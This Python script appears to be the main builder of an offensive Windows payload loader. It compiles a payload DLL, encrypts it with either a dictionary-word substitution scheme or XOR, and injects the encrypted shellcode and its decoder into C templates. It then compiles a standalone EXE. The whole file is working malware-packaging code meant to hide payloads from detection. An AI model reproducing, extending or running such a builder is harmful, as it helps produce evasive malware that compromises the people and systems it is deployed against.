#!/usr/bin/env python3
# PYTHON_ARGCOMPLETE_OK

from configparser import ConfigParser
from core.encryptor import Encryptor
from core.templator import Templator
from core.configator import check_config_and_merge
from core.utils import round_pow2, format_instructions
from core.orchestrator import prepare_build_env, build_dll, build_exe
from core.argparsor import parse_args, get_selected_payload
import random

PAYLOAD_DIR = "src/dll/payloads"
WORKING_FOLDER = "build/"


def main():
    config = ConfigParser()
    config.read(".conf")

    args = parse_args()
    print(args) if args.verbose else None

    args = check_config_and_merge(config, args)

    # logger todo here

    payload = get_selected_payload(args)

    if args.verbose:
        print(f"[i] building with payload='{payload}', output='{args.output}', small={args.small}")

    # Step 0: Prepare build environment
    prepare_build_env() # rm -rf build && mkdir -p build/bin bin && cp -r src include build/


    # Step 1: Replace templates in files
    templator = Templator(working_dir="build/", verbose=args.verbose)
    tags_by_file = templator.extract_tags_from_folder("build/", exceptions=["XOR_KEY", "PAYLOAD", "SHELLCODE", "SHELLCODE_DECODER", "PAYLOAD_SIZE"])

    not_replaced_tags = templator.process_tags(tags_by_file, config, args)

    if not_replaced_tags:
        print("[i] Tags not replaced (may be normal if no config value provided):") if args.verbose else None
        print(tag['name'] for tag in not_replaced_tags) if args.verbose else None
        print(f"Total tags not replaced: {len(not_replaced_tags)}") if args.verbose else None

    # Step 2: Build DLL (payload)
    build_dll(payload, verbose=args.verbose)  # bash scripts/compile_dll.sh payload

    # Step 3: Encrypt payload
    with open(f"{PAYLOAD_DIR}/{payload}.c", 'rb') as file:
        content = file.read()
        payload = content.hex()

    if "dict" in config.get("Payload", "encryption_method"):
        encryptor = Encryptor(method="dict", verbose=args.verbose)  # init
        encryptor.set_wordlist("data/words_100000.txt")             # set self.wordlist
        encrypted_payload = encryptor.dict_encrypt(payload)         # get encrypted payload, C formatted
        dict_table = encryptor.get_association_table()              # get C association table
        dict_size = encryptor.get_nb_words()                      # get final size of the dictionary
    # XOR IS DUMB, TO REMOVE
    elif "xor" in config.get("Payload", "encryption_method"):
        encryptor = Encryptor(method="xor", verbose=args.verbose)
        if config.getint("Payload", "encryption_key"):
            key = config.getint("Payload", "encryption_key")
            if key < 0x1111 or key > 0xFFFF:
                raise ValueError("XOR key must be between 0x1111 and 0xFFFF")
            encryptor.set_key(key)
        elif config.get("Payload", "encryption_key") == "random":
            encryptor.set_key(random.randint(0x1111, 0xFFFF))
        else:
            raise ValueError("Invalid XOR key specified in the configuration (.conf) file.\nUse a hex value (e.g. 0x1337) or 'random'.")
        encrypted_payload = encryptor.xor_encrypt(payload)
    else:
        raise ValueError("Unknown encryption method")

    # Step 3: Replace payload in main app
    if "dict" in config.get("Payload", "encryption_method"):
        templator.sed_files("%__XOR_KEY__%", str(random.randint(0, 0xFF)))
        templator.sed_files("%__PAYLOAD_SIZE__%", str(round_pow2(dict_size)))
        templator.sed_files("%__SHELLCODE_DECODER__%", "DICT_decrypt(dict_payload);")
        templator.sed_files("%__SHELLCODE__%", f"unsigned char payload[];\n\n{dict_table}\n\nconst char* dict_payload = {encrypted_payload};")
    elif "xor" in config.get("Payload", "encryption_method"):
        templator.sed_files("%__PAYLOAD_SIZE__%", str(round_pow2(len(encrypted_payload)//2)))
        templator.sed_files("%__SHELLCODE_DECODER__%", "XOR(payload,sizeof(payload),key);")
        templator.sed_files("%__SHELLCODE__%", f"unsigned char payload[] = \"{format_instructions(encrypted_payload)}\";")
        pass

    if args.small:
        templator.sed_files("int WinMain(", "int WinMainCRTStartup(")
        # libc switch will occur at compile time

    # Step 4: Build EXE
    build_exe(output_file=args.output, prioritize_size=args.small, verbose=args.verbose)  # bash scripts/compile_exe.sh -o <output_file> --prioritize-size <true|false>


if __name__ == "__main__":
    main()
